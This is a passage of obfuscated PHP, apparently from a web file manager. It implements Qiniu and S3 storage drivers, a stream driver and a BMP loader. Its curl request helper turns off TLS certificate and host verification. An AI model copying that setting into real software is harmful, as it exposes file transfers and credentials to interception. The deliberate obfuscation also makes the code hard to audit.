$fڤ = rtrim($fڤ, $C[47]); Model($C[469])->metaSet($Döϋ, self::JOB_KEY, $fڤ); goto Fֳ; Fֳ: } public function getUserJob($E֜Ó) { $Fݤ = Model($_SERVER[놫Ӱ][469])->metaGet($E֜Ó); return $this->getUserJobInfo($Fݤ[self::JOB_KEY]); } public function getUserJobInfo($Bɼ) { goto B듛; B듛: $Cޗ =& $_SERVER[놫Ӱ]; $FЈ = explode($Cޗ[47], $Bɼ); $AӲ߽ = parent::listData(); goto c; Fף: return $A焌; goto d멜; c: $AӲ߽ = array_remove_key($AӲ߽, $Cޗ[184]); $A焌 = array(); foreach ($FЈ as $e܇) { if (isset($AӲ߽[$e܇])) { $A焌[] = $AӲ߽[$e܇]; } } goto Fף; d멜: } } goto Eܦ; Cƈ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($aߐ) { parent::__construct(); require_once SDK_DIR . $_SERVER[놫Ӱ][1168]; $this->_init($aߐ); } public function _init($aլ) { foreach ($aլ as $b => $Aڐ) { if (isset($this->{$b})) { $this->{$b} = $Aڐ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[놫Ӱ][1169], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($fވ, $e = '', $CϽͨ = REPEAT_RENAME) { if ($this->setContent($fވ, $e)) { return $this->getPathOuter($fވ); } return !1; } public function mkdir($Bɦؠ, $EΥ = REPEAT_SKIP) { goto bؖ; bؖ: $Aփ =& $_SERVER[놫Ӱ]; $eã = trim($Bɦؠ, $Aփ[8]); if ($this->_isFolder($eã)) { return $this->getPathOuter($eã); } goto d; AŚڻ: if (!$this->mkfile($E㇠)) { return !1; } if (!$this->moveFile($E㇠, $Bɦؠ)) { $this->delFile($E㇠); return !1; } return $this->getPathOuter($eã); goto Dӑβ; d: $Bɦؠ = $eã . $Aփ[8]; $Dķʪ = get_path_this($eã); $E㇠ = $Bɦؠ . $Dķʪ; goto AŚڻ; Dӑβ: } public function copyFile($c赹, $Eڏ) { $D = $this->bucketManager->copy($this->bucket, $c赹, $this->bucket, $Eڏ, !0); return $D ? !1 : !0; } public function moveFile($eߖ, $eΠ) { $d = $this->bucketManager->move($this->bucket, $eߖ, $this->bucket, $eΠ, !0); return $d ? !1 : !0; } public function delFile($FＹ) { $c = $this->bucketManager->delete($this->bucket, $FＹ); return $c ? !1 : !0; } public function delFolder($DԹ) { $c = $this->fileList($DԹ); if (empty($c)) { return !0; } $bʿ޷ = 1000; if (count($c) <= $bʿ޷) { return $this->qnDelObj($c) ? !1 : !0; } foreach (array_chunk($c, $bʿ޷) as $Aݰ) { $a̿ = $this->qnDelObj($Aݰ); if ($a̿) { return !1; } } return !0; } private function qnDelObj($B歇) { $C֯ = $this->bucketManager->buildBatchDelete($this->bucket, $B歇); list($bӫ, $F) = $this->bucketManager->batch($C֯); return $F; } private function fileList($aۻ׸, $Eӱ = 0) { goto EѢ; E: $B΂Ʒ = $E樅[33]; $B􌕞 = 1000; $B = $E樅[33]; goto EͰ; EͰ: $bߐ = array(); while (!0) { list($f뵾, $Fނʓ) = $this->bucketManager->listFiles($this->bucket, $c愞, $B΂Ʒ, $B􌕞, $B); if ($Fނʓ) { return !1; } $B΂Ʒ = array_key_exists($E樅[1139], $f뵾) ? $B΂Ʒ = $f뵾[$E樅[1170]] : $E樅[33]; foreach ($f뵾[$E樅[1171]] as $bʂ) { $eտ = $bʂ[$E樅[88]]; if ($Eӱ) { $eտ = array($E樅[28] => $eտ, $E樅[78] => $bʂ[$E樅[1172]]); } $bߐ[] = $eտ; } if ($B΂Ʒ == $E樅[33]) { break; } } return $bߐ; goto Dϐ; EѢ: $E樅 =& $_SERVER[놫Ӱ]; $aۻ׸ = trim($aۻ׸, $E樅[8]); $c愞 = empty($aۻ׸) ? $E樅[33] : $aۻ׸ . $E樅[8]; goto E; Dϐ: } public function rename($Dұ͙, $cƷ) { return $this->renameObject($Dұ͙, $cƷ); } public function fileInfo($a, $aˎ˿ = false, $d = array()) { goto e쥐; EЂǳ: if (empty($d)) { $d = $this->objectMeta($a); if (!$d) { return $C; } } if (isset($d[$cǧߌ[1173]])) { $C[$cǧߌ[184]] = $d[$cǧߌ[1173]]; } if (isset($d[$cǧߌ[1172]])) { $C[$cǧߌ[78]] = $d[$cǧߌ[1172]]; } goto Fȅ؇; e쥐: $cǧߌ =& $_SERVER[놫Ӱ]; if ($aˎ˿) { return array($cǧߌ[28] => $this->pathThis($a), $cǧߌ[76] => $this->getPathOuter($cǧߌ[8] . $a), $cǧߌ[29] => $cǧߌ[164], $cǧߌ[78] => isset($d[$cǧߌ[1172]]) ? $d[$cǧߌ[1172]] : 0, $cǧߌ[157] => $this->ext($a)); } $C = array($cǧߌ[28] => $this->pathThis($a), $cǧߌ[76] => $this->getPathOuter($cǧߌ[8] . $a), $cǧߌ[29] => $cǧߌ[164], $cǧߌ[184] => $cǧߌ[50], $cǧߌ[106] => $cǧߌ[50], $cǧߌ[78] => 0, $cǧߌ[157] => $this->ext($a), $cǧߌ[185] => !0, $cǧߌ[186] => !0); goto EЂǳ; Fȅ؇: return $C; goto eէԊ; eէԊ: } public function folderInfo($E֠ϟ, $e첮 = false) { $Eɏ =& $_SERVER[놫Ӱ]; if ($e첮) { return array($Eɏ[28] => $this->pathThis($E֠ϟ), $Eɏ[76] => $this->getPathOuter($Eɏ[8] . $E֠ϟ), $Eɏ[29] => $Eɏ[77]); } $C۽ = array($Eɏ[28] => $this->pathThis($E֠ϟ), $Eɏ[76] => $this->getPathOuter($Eɏ[8] . $E֠ϟ), $Eɏ[29] => $Eɏ[77], $Eɏ[184] => $Eɏ[50], $Eɏ[106] => $Eɏ[50], $Eɏ[1117] => !0, $Eɏ[1118] => !0); if (empty($aņհ)) { $E֠ϟ = rtrim($E֠ϟ, $Eɏ[8]) . $Eɏ[8]; $aª = $this->objectMeta($E֠ϟ); if (!$aª) { return $C۽; } } if (isset($aņհ[$Eɏ[1173]])) { $C۽[$Eɏ[184]] = $aņհ[$Eɏ[1173]]; } return $C۽; } public function listPath($eֱٙ, $CȻ = false) { goto c΅ʵ; c΅ʵ: $cҟ =& $_SERVER[놫Ӱ]; $eֱٙ = trim($eֱٙ, $cҟ[8]); $fʂ = empty($eֱٙ) ? $cҟ[33] : $eֱٙ . $cҟ[8]; goto B; CץÙ: $e̠Ĭ = $Aՠܬ = array(); while (!0) { list($d, $fȸ) = $this->bucketManager->listFiles($this->bucket, $fʂ, $e, $bӶ, $D); if ($fȸ) { return !1; } $e = array_key_exists($cҟ[1139], $d) ? $e = $d[$cҟ[1170]] : $cҟ[33]; if (isset($d[$cҟ[1174]])) { foreach ($d[$cҟ[1174]] as $Aަ) { if ($Aަ == $fʂ) { continue; } $e̠Ĭ[] = $this->folderInfo($Aަ, $CȻ); } } if (isset($d[$cҟ[1171]])) { foreach ($d[$cҟ[1171]] as $F߷) { if ($F߷[$cҟ[88]] == $fʂ) { continue; } $Aՠܬ[] = $this->fileInfo($F߷[$cҟ[88]], $CȻ, $F߷); } } if ($e == $cҟ[33]) { break; } } return array($cҟ[75] => $e̠Ĭ, $cҟ[74] => $Aՠܬ); goto f̑; B: $e = $cҟ[33]; $bӶ = 1000; $D = $cҟ[8]; goto CץÙ; f̑: } public function has($a, $aŵ = false, $b = true) { goto Cᇖ; Cᇖ: $A̔ =& $_SERVER[놫Ӱ]; $a = trim($a, $A̔[8]); $aқή = empty($a) ? $A̔[33] : $a . $A̔[8]; goto Aŭ̈; Aŭ̈: $c = $A̔[33]; $FⳐ = 1000; $CǄ = $A̔[8]; goto Eݿ橧; Eңɂ: if ($aŵ) { return array($A̔[188] => $b͵Թ, $A̔[189] => $f); } return !1; goto dЙ; Eݿ橧: $b͵Թ = 0; $f = 0; while (!0) { list($Eզ, $Cĩ) = $this->bucketManager->listFiles($this->bucket, $aқή, $c, $FⳐ, $CǄ); if ($Cĩ) { return !1; } $c = array_key_exists($A̔[1139], $Eզ) ? $c = $Eզ[$A̔[1170]] : $A̔[33]; if ($aŵ) { if (!empty($Eզ[$A̔[1171]])) { $b͵Թ += count($Eզ[$A̔[1171]]); } if (!empty($Eզ[$A̔[1174]])) { $f += count($Eզ[$A̔[1174]]); } if ($c === $A̔[33]) { break; } continue; } if ($b) { if (!empty($Eզ[$A̔[1171]])) { return !0; } } else { if (!empty($Eզ[$A̔[1174]])) { return !0; } } if ($c == $A̔[33]) { break; } } goto Eңɂ; dЙ: } public function listAll($bߴ) { $Fܔ翶 =& $_SERVER[놫Ӱ]; $e = $this->fileList($bߴ, 1); $A݌ = array(); foreach ($e as $dۖ) { $A݌[$dۖ[$Fܔ翶[28]]] = $dۖ[$Fܔ翶[78]]; } return $this->listAllFiles($bߴ, array_keys($A݌), $A݌); } public function canRead($A潿) { return $this->exist($A潿) ? !0 : !1; } public function canWrite($Aє) { return $this->exist($Aє) ? !0 : !1; } public function getContent($F) { return $this->fileSubstr($F, 0, -1); } public function setContent($bӽɃ, $C = '') { $Dʼ = $this->tempFile($this->pathThis($bӽɃ)); file_put_contents($Dʼ, $C); if ($this->upload($bӽɃ, $Dʼ)) { $this->tempFileRemve($Dʼ); return !0; } return !1; } public function refreshUrls($A) { goto A٤đ; b: $b¼ = new Qiniu\Cdn\CdnManager($this->auth); list($B߰, $d) = $b¼->refreshUrls($C); if ($d) { return !1; } goto d𤵏; A٤đ: $a߂ =& $_SERVER[놫Ӱ]; $C = array(); if (is_array($A)) { foreach ($A as $Aה) { $C[] = $this->link($Aה); } } else { $C[] = $this->link($A); } goto b; d𤵏: return $B߰[$a߂[1175]] == $a߂[681] ? !0 : !1; goto cՆ; cՆ: } public function fileSubstr($A, $B, $E) { $fٟ، =& $_SERVER[놫Ӱ]; if (!($c = $this->link($A))) { return !1; } $E = array($fٟ،[1142] => $B, $fٟ،[322] => $E); return $this->qnRequest($c, $E); } public function upload($eߺ, $F, $Bɰ = false, $Bڣ = REPEAT_REPLACE) { $dҌ = new Qiniu\Storage\UploadManager(); $Fڶ = $this->auth->uploadToken($this->bucket, $eߺ); $C˟ = get_file_mime(get_path_ext($F)); list($C𓜊, $a) = $dҌ->putFile($Fڶ, $eߺ, $F, null, $C˟); return $a ? !1 : $this->getPathOuter($eߺ); } public function uploadFormData($F, $eΰ = 3600) { return $this->uploadToken($F, $eΰ); } public function multiUploadFormData($C, $c = 3600) { return $this->uploadToken($C, $c); } private function uploadToken($fА, $fҗ˔ = 3600) { goto e; e: $d =& $_SERVER[놫Ӱ]; $fߟ = $fҗ˔; $F = array($d[1176] => $d[1177]); goto B; a: $C҈ = http_type() . "\x3a\57\x2f\x75\160\x6c\157\141\144{$D̏}\56\161\x69\x6e\x69\165\x70\56\x63\157\x6d\57"; return array($d[1179] => $E, $d[1180] => $C҈); goto Eڡ; B: $eӻ = null; $E = $this->auth->uploadToken($this->bucket, $eӻ, $fߟ, $F, !0); $D̏ = empty($this->region) || $this->region == $d[1178] ? $d[33] : $d[408] . $this->region; goto a; Eڡ: } public function download($A୚, $E) { goto e﷠; dϓ: while (!0) { $BŔ = array($F׵[1142] => $cô, $F׵[322] => $DԾ); $c๵鸙 = $this->qnRequest($d諆ߏ, $BŔ); if ($cô && ($Cɛ = @json_decode($c๵鸙, !0))) { if (isset($Cɛ[$F׵[1175]])) { return !1; } } fwrite($fˎ, $c๵鸙); $cô += $DԾ; if (strlen($c๵鸙) < $DԾ) { break; } } fclose($fˎ); return $E; goto D٤; Aѯ: $cô = 0; $DԾ = 1024 * 200; $fˎ = fopen($cʝو, $F׵[1181]); goto dϓ; e﷠: $F׵ =& $_SERVER[놫Ӱ]; $cʝو = IO::getPathInner(IO::mkfile($E)); if (!($d諆ߏ = $this->link($A୚))) { return !1; } goto Aѯ; D٤: } public function link($aڲ, $BϷ = '') { if (!$this->isFile($aڲ)) { return !1; } $Bډ쥖 = $this->getHost() . $_SERVER[놫Ӱ][8] . $this->pathEncode($aڲ) . $BϷ; return $this->auth->privateDownloadUrl($Bډ쥖, 3600 * 12); } public function fileOut($C҆, $ëӿѷ = false, $C = false, $Eսź = '') { $c =& $_SERVER[놫Ӱ]; if (!$C) { $C = $this->pathThis($C҆); } $B = $ëӿѷ ? $c[1182] . rawurlencode($C) : $c[33]; $aӴѲ = $this->link($C҆, $B); $this->fileOutLink($aӴѲ); } public function fileOutServer($Fӹփ, $c¨ = false, $B﬉ = false, $C = '') { parent::fileOut($Fӹփ, $c¨, $B﬉, $C); } public function fileOutImage($A, $FӾ = 250) { $a = $this->link($A, $_SERVER[놫Ӱ][1183] . $FӾ); $this->fileOutLink($a); } public function fileOutImageServer($aҚ, $e = 250) { parent::fileOutImage($aҚ, $e); } public function fileOutLink($E) { header($_SERVER[놫Ӱ][153] . $E); die; } public function hashMd5($cǊ) { $a䅊 =& $_SERVER[놫Ӱ]; $f¸ = $this->objectMeta($cǊ); if (isset($f¸[$a䅊[193]])) { return $f¸[$a䅊[193]]; } $E෾ = $this->link($cǊ, $a䅊[1184]); $a䄹 = $this->qnRequest($E෾, array(), !0); return !isset($a䄹[$a䅊[194]]) ? !1 : $a䄹[$a䅊[194]]; } public function qnRequest($f׭, $fϖ = array(), $B׵ = false) { goto C; D蟪: curl_setopt($CĹ, CURLOPT_PROGRESSFUNCTION, $d優ď[1185]); curl_progress_start($CĹ); if (isset($fϖ[$d優ď[1142]]) && $fϖ[$d優ď[322]] > 0) { $eťԶ = $fϖ[$d優ď[1142]]; $cØǧ = $fϖ[$d優ď[1142]] + ($fϖ[$d優ď[322]] - 1); curl_setopt($CĹ, CURLOPT_RANGE, "{$eťԶ}\55{$cØǧ}"); } goto E; d: curl_setopt($CĹ, CURLOPT_RETURNTRANSFER, 1); curl_setopt($CĹ, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($CĹ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Aɭ; E: curl_setopt($CĹ, CURLOPT_FOLLOWLOCATION, 1); $d = curl_exec($CĹ); curl_progress_end($CĹ); goto E˴; Aɭ: curl_setopt($CĹ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($CĹ, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($CĹ, CURLOPT_NOPROGRESS, !1); goto D蟪; C: $d優ď =& $_SERVER[놫Ӱ]; $CĹ = curl_init(); curl_setopt($CĹ, CURLOPT_URL, $f׭); goto d; E˴: curl_close($CĹ); if ($B׵) { return @json_decode($d, !0); } return $d; goto d; d: } public function size($Bą) { $B󪋎 = $this->objectMeta($Bą); return $B󪋎 ? $B󪋎[$_SERVER[놫Ӱ][78]] : 0; } public function info($DɃ) { if ($this->isFolder($DɃ)) { return $this->folderInfo($DɃ); } else { if ($this->isFile($DɃ)) { return $this->fileInfo($DɃ); } } return !1; } public function exist($C) { return $this->isFile($C) || $this->isFolder($C); } public function isFile($cޜ) { return !$this->isFolder($cޜ) && $this->objectMeta($cޜ); } public function isFolder($B쇈) { return $this->cacheMehod($_SERVER[놫Ӱ][220], $B쇈); } protected function objectMeta($CŇڃ) { return $this->cacheMehod($_SERVER[놫Ӱ][221], $CŇڃ); } protected function _objectMeta($Dꃞ) { list($dғ֣, $dݍ) = $this->bucketManager->stat($this->bucket, $Dꃞ); return $dғ֣; } protected function _isFolder($E) { $eӒ =& $_SERVER[놫Ӱ]; list($Fº, $C؎) = $this->bucketManager->listFiles($this->bucket, trim($E, $eӒ[8]) . $eӒ[8], $eӒ[33], 1, $eӒ[8]); return !empty($Fº[$eӒ[1171]]) || !empty($Fº[$eӒ[1174]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($cͪĻ) { parent::__construct($cͪĻ); } public function uploadFormData($e, $dك = 3600) { goto c¶; eć: $c٢ = $fܥф[1092]; $B叮 = $dك . $fܥф[33]; $eىϔ = $fܥф[1060]; goto f; c¶: $fܥф =& $_SERVER[놫Ӱ]; $eţ = $fܥф[182]; $Bݒɱ = $fܥф[1090]; goto Eۖ; f: $F = array($this->accessKey, $f, $this->region, $cԌ, $c٢); $A = implode($fܥф[8], $F); $dℓӐ = array($fܥф[1062] => gmdate($fܥф[1061], strtotime($fܥф[1093])), $fܥф[1063] => array(array($fܥф[1065] => $this->bucket), array($fܥф[1064] => $eţ), array($fܥф[1066], $fܥф[1067], $fܥф[33]), array($fܥф[1066], $fܥф[1094], $fܥф[33]), array($fܥф[1066], $fܥф[1095], $fܥф[33]), array($fܥф[1068] => $eىϔ), array($fܥф[1096] => $A), array($fܥф[1097] => $Bݒɱ), array($fܥф[1098] => $c), array($fܥф[1099] => $B叮))); goto aޞ; aޞ: $fĂ迵 = base64_encode(json_encode($dℓӐ)); $dԮز = hash_hmac($fܥф[1100], $f, $fܥф[1101] . $this->secret, !0); $f = hash_hmac($fܥф[1100], $this->region, $dԮز, !0); goto C؎功; C؎功: $dÂ = hash_hmac($fܥф[1100], $cԌ, $f, !0); $Cͦ = hash_hmac($fܥф[1100], $c٢, $dÂ, !0); $Fғ = hash_hmac($fܥф[1100], $fĂ迵, $Cͦ); goto aӒΎ; Eۖ: $cԌ = $fܥф[59]; $c = gmdate($fܥф[1091]); $f = gmdate($fܥф[675]); goto eć; aӒΎ: $bƊ = array($fܥф[196] => $fܥф[33], $fܥф[1102] => $fܥф[33], $fܥф[1064] => $eţ, $fܥф[1068] => $eىϔ, $fܥф[1072] => $fĂ迵, $fܥф[1103] => $A, $fܥф[1104] => $Bݒɱ, $fܥф[1105] => $c, $fܥф[1106] => $B叮, $fܥф[1107] => $Fғ, $fܥф[166] => $this->getHost()); return $bƊ; goto e陇̨; e陇̨: } public function multiUploadFormData($c, $Eɢ = 3600) { $e =& $_SERVER[놫Ӱ]; $Eй = gmdate($e[1186]); $C = array(); $DꝎ = $this->client->getUploadId($this->bucket, $c, $C); if (!$DꝎ) { return !1; } return array($e[206] => $DꝎ, $e[166] => $this->getHost() . $e[8] . $this->pathEncode($c), $e[207] => $Eй, $e[88] => $c); } public function multiUploadAuthData($dӭߌ, $bؗ = array()) { goto C尦; Dة: $b靨 = $f޲סĘ[211]; $B͖ = $f޲סĘ[8] . $this->pathEncode($CĹ) . $aۛԑ; $E = $this->client->__getSignatureV4($eř, $EК, $b靨, $B͖); goto D; a֨: if (isset($bؗ[$f޲סĘ[1187]])) { $eř[$f޲סĘ[1188]] = $bؗ[$f޲סĘ[1187]]; } $fُ = explode($f޲סĘ[168], $this->getHost()); $EК = array($f޲סĘ[1189] => $fُ[1], $f޲סĘ[1190] => $f޲סĘ[33], $f޲סĘ[196] => $f޲סĘ[115], $f޲סĘ[1102] => $bؗ[$f޲סĘ[78]]); goto Dة; Bϒ: unset($bؗ[$f޲סĘ[88]]); if (isset($bؗ[$f޲סĘ[208]])) { return $this->listUploadParts($CĹ, $bؗ); } $eř = array(); goto a֨; C尦: $f޲סĘ =& $_SERVER[놫Ӱ]; $aۛԑ = isset($bؗ[$f޲סĘ[157]]) ? $bؗ[$f޲סĘ[157]] : $f޲סĘ[33]; $CĹ = $bؗ[$f޲סĘ[88]]; goto Bϒ; D: if (strpos($aۛԑ, $f޲סĘ[210]) === 0) { if (isset($eř[$f޲סĘ[1188]])) { $b = $eř[$f޲סĘ[1188]]; } else { if (isset($E[$f޲סĘ[1188]])) { $b = $E[$f޲סĘ[1188]]; } else { $b = hash($f޲סĘ[1100], $f޲סĘ[33]); } } return array($f޲סĘ[217] => $E[$f޲סĘ[217]], $f޲סĘ[1188] => $b, $f޲סĘ[207] => $E[$f޲סĘ[1191]]); } return $E[$f޲סĘ[217]]; goto CԠ; CԠ: } public function listUploadParts($e, $A = array()) { goto d˥; bÍ: $EΆَ = $this->client->__getSignatureV4($a٢, $Aƅۨ, $e׏, $B΢겧, $eĢĥ); return array($e[217] => $EΆَ[$e[217]], $e[207] => $EΆَ[$e[1191]], $e[219] => $D߮Ɛ, $e[1188] => $EΆَ[$e[1188]]); goto aߓ; aŚ: $Aƅۨ = array($e[1189] => $cʴ[1], $e[196] => $e[115], $e[1102] => strlen($eĢĥ)); $e׏ = $e[209]; $B΢겧 = $e[8] . $this->pathEncode($e) . $A[$e[157]]; goto bÍ; d˥: $e =& $_SERVER[놫Ӱ]; $bӆ = str_replace($e[218], $e[33], $A[$e[157]]); $D߮Ɛ = $this->client->listParts($this->bucket, $e, $bӆ); goto Aڳ; f夏쎻: $eĢĥ .= $e[1195]; $a٢ = array(); $cʴ = explode($e[168], $this->getHost()); goto aŚ; Aڳ: if (!$D߮Ɛ) { return !1; } $eĢĥ = $e[1192]; foreach ($D߮Ɛ as $f԰) { $eĢĥ .= $e[1193] . "\x3c\120\141\x72\164\116\165\155\x62\145\162\76{$f԰[$e[1144]]}\x3c\57\x50\141\x72\x74\x4e\x75\x6d\142\x65\162\76\12" . "\x3c\105\124\141\x67\x3e{$f԰[$e[1145]]}\74\x2f\x45\124\141\x67\76\12" . $e[1194]; } goto f夏쎻; aߓ: } public function link($Dƿɗ, $b = array()) { return parent::link($Dƿɗ, $b); } public function fileOut($F߉, $d = false, $eۭ = false, $Fڇ = '') { if (strstr($this->endpoint, $_SERVER[놫Ӱ][1196])) { return parent::fileOutServer($F߉, $d, $eۭ, $Fڇ); } parent::fileOut($F߉, $d, $eۭ, $Fڇ); } public function fileOutImage($e, $c؜ = 250) { if (strstr($this->endpoint, $_SERVER[놫Ӱ][1196])) { return parent::fileOutImageServer($e, $c؜); } parent::fileOutImage($e, $c؜); } public function getHost() { $eʂ =& $_SERVER[놫Ӱ]; $Fテ = rtrim(parent::getHost(), $eʂ[8] . $this->bucket); $Fテ = explode($eʂ[168], $Fテ); return $Fテ[0] . $eʂ[168] . $this->bucket . $eʂ[92] . $Fテ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($D럄, $e݃ = 0) { parent::__construct(); $this->source = $D럄; $this->sourceSize = $e݃; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($cϳ = false) { return $this->sourceSize; } public function getContent($a = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $fþ = ftell($this->source); $ȆǇ = @fread($this->source, $this->sourceSize); fseek($this->source, $fþ); return $ȆǇ; } } public function fileSubstr($E񗌼 = false, $A = 0, $c = 0) { if (!$c) { $c = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $A, $c); } if ($this->sourceType == self::TYPE_FILE) { $eе = ftell($this->source); fseek($this->source, $eе + $A); $d呷 = @fread($this->source, $c); fseek($this->source, $eе); return $d呷; } } public function hashMd5($e˝ߍ = false) { return md5($this->getContent()); } public static function hash($C݂Ф, $A∑ = 0) { $b۩ = new PathDriverStream($C݂Ф, $A∑); return $b۩->hashSimple($C݂Ф); } public static function md5($d, $f = 0) { $C = new PathDriverStream($d, $f); return $C->hashMd5($d); } } goto Bȥ; BĪ: class ImageGdBMP { public static function load($bę) { $Cː = fopen($bę, $_SERVER[놫Ӱ][1418]); if ($Cː === !1) { return !1; } $e͎ = self::loadFromStream($Cː); fclose($Cː); return $e͎; } public static function loadFromStream($cĳ) { $d⼑ =& $_SERVER[놫Ӱ]; $dŬ = fread($cĳ, 14); if ($dŬ === !1) { return !1; } if ($dŬ[0] != $d⼑[1728] || $dŬ[1] != $d⼑[1729]) { return !1; } $Fڢ = unpack($d⼑[1730] . $d⼑[1731] . $d⼑[1732] . $d⼑[1733] . $d⼑[1734], $dŬ); return self::loadFromStreamAndFileHeader($cĳ, $Fڢ); } public static function loadFromStreamAndFileHeader($AҴ, array $eϪ؄) { goto F; F: $E =& $_SERVER[놫Ӱ]; if ($eϪ؄[$E[385]] != 19778) { return !1; } $bʚ = fread($AҴ, 4); goto EՒ; D: if ($EŠ == 1 || $EŠ == 4 || $EŠ == 8) { goto fж֪; e: $D = array(); for ($Bذ = 0; $Bذ < $b⓷; ++$Bذ) { $bʚ = fread($AҴ, $dٯ); if ($bʚ === !1) { imagedestroy($C޶); return !1; } extract(unpack($E[1754], $bʚ . $E[1753])); $D[] = imagecolorallocate($C޶, $aں҂, $Dط, $A睡); } $c٢ = 8 - $EŠ; goto e٦ՠ; e٦ՠ: $C = (1 << $EŠ) - 1 << $c٢; if ($eۣ == 1 || $eۣ == 2) { $B = 0; $Eչ = $EŠ >> 2 & 1; for (;;) { if ($B < -1 || $B > $b̏ || $eØ < -1 || $eØ > $Fǔ) { imagedestroy($C޶); return !1; } $bʚ = fread($AҴ, 1); if ($bʚ === !1) { imagedestroy($C޶); return !1; } switch ($bʚ) { case $E[1753]: $bʚ = fread($AҴ, 1); if ($bʚ === !1) { imagedestroy($C޶); return !1; } switch ($bʚ) { case $E[1753]: $eØ += $CއŜ; $B = 0; break; case $E[1755]: $eØ = 0; $B = 0; break 3; case $E[1756]: $bʚ = fread($AҴ, 2); if ($bʚ === !1) { imagedestroy($C޶); return !1; } list(, $Fݦ, $Dʣ) = unpack($E[1757], $bʚ); $B += $Fݦ; $eØ += $Dʣ * $CއŜ; break; default: list(, $Aћޕ) = unpack($E[1758], $bʚ); $bз = ($Aћޕ >> $Eչ) + ($Aћޕ & $Eչ); $bʚ = fread($AҴ, $bз + 1 & ~1); if ($bʚ === !1) { imagedestroy($C޶); return !1; } for ($Bذ = 0, $e = 0; $Bذ < $Aћޕ; ++$Bذ, ++$B, $e += $EŠ) { list(, $FϠ) = unpack($E[1758], $bʚ[$e >> 3]); $A睡 = $e & 7; imagesetpixel($C޶, $B, $eØ, $D[($FϠ & $C >> $A睡) >> $c٢ - $A睡]); } break; } break; default: $d֫ = fread($AҴ, 1); if ($d֫ === !1) { imagedestroy($C޶); return !1; } list(, $Dڰ, $FϠ) = unpack($E[1757], $bʚ . $d֫); for ($Bذ = 0, $e = 0; $Bذ < $Dڰ; ++$Bذ, ++$B, $e += $EŠ) { $A睡 = $e & 7; imagesetpixel($C޶, $B, $eØ, $D[($FϠ & $C >> $A睡) >> $c٢ - $A睡]); } break; } } } else { for ($Aۦ = 0; $Aۦ < $Cݪ; ++$Aۦ, $eØ += $CއŜ) { $bʚ = fread($AҴ, $F); if ($bʚ === !1) { imagedestroy($C޶); return !1; } $e = 0; for ($B = 0; $B < $b̏; ++$B, $e += $EŠ) { list(, $FϠ) = unpack($E[1758], $bʚ[$e >> 3]); $A睡 = $e & 7; imagesetpixel($C޶, $B, $eØ, $D[($FϠ & $C >> $A睡) >> $c٢ - $A睡]); } } } goto C󐲕; fж֪: $C޶ = imagecreate($b̏, $Cݪ); $dٯ = $b򊠤 == 12 ? 3 : 4; $b⓷ = $fʃ ? $fʃ : pow(2, $EŠ); goto e; C󐲕: } else { goto fǹ; Cص: for ($Aۦ = 0; $Aۦ < $Cݪ; ++$Aۦ, $eØ += $CއŜ) { $bʚ = fread($AҴ, $F); if ($bʚ === !1) { imagedestroy($C޶); return !1; } $e = 0; for ($B = 0; $B < $b̏; ++$B, $e += $E㿍˘) { list(, $FϠ) = unpack($E[1735], substr($bʚ, $e, $E㿍˘) . $E[1759]); $Dοߚ = $FϠ & $D; $e˄ = $FϠ & $Fڴ; $dÈƪ = $FϠ & $Cɦ; $aӂ = $FϠ & $Eʊ; $eӭ = $b - (($Dοߚ << 7) - $Dοߚ) * $BЏ߾˅; $aں҂ = (($e˄ << 8) - $e˄) * $C; $Dط = (($dÈƪ << 8) - $dÈƪ) * $E; $A睡 = (($aӂ << 8) - $aӂ) * $b͙̺; imagesetpixel($C޶, $B, $eØ, $eӭ << 24 | $aں҂ << 16 | $Dط << 8 | $A睡); } } imagealphablending($C޶, !0); goto f҄ŕ; fǹ: $C޶ = imagecreatetruecolor($b̏, $Cݪ); imagealphablending($C޶, !1); if ($D) { imagesavealpha($C޶, !0); } goto Dץ֚; F: $C = $Fڴ ? 1 / $Fڴ : 1; $E = $Cɦ ? 1 / $Cɦ : 1; $b͙̺ = $Eʊ ? 1 / $Eʊ : 1; goto Cص; Dץ֚: $E㿍˘ = $EŠ >> 3; $b = $D ? 127 : 0; $BЏ߾˅ = $D ? 1 / $D : 1; goto F; f҄ŕ: } return $C޶; goto Fݎ; D֕: $Cݪ = abs($Fǔ); $eØ = $Fǔ > 0 ? $Cݪ - 1 : 0; $CއŜ = $Fǔ > 0 ? -1 : 1; goto D; EՒ: if ($bʚ === !1) { return !1; } list(, $b򊠤) = unpack($E[1735], $bʚ); if ($b򊠤 == 12) { goto B; B: $bʚ = fread($AҴ, $b򊠤 - 4); if ($bʚ === !1) { return !1; } extract(unpack($E[1736] . $E[1737] . $E[1738] . $E[1739], $bʚ)); goto a僅ݖ; a僅ݖ: $fʃ = $f﯉ = $D = $eۣ = 0; $Fڴ = 16711680; $Cɦ = 65280; goto d; d: $Eʊ = 255; goto eݑ; eݑ: } else { if (124 < $b򊠤 || $b򊠤 < 40) { return !1; } else { goto BƆŧ; BƩ: if ($b̏ & 2147483648) { $b̏ = -(~$b̏ & 4294967295) - 1; } if ($Fǔ & 2147483648) { $Fǔ = -(~$Fǔ & 4294967295) - 1; } if ($aË & 2147483648) { $aË = -(~$aË & 4294967295) - 1; } goto eڲՆ; eڲՆ: if ($Cߏ᝞ & 2147483648) { $Cߏ᝞ = -(~$Cߏ᝞ & 4294967295) - 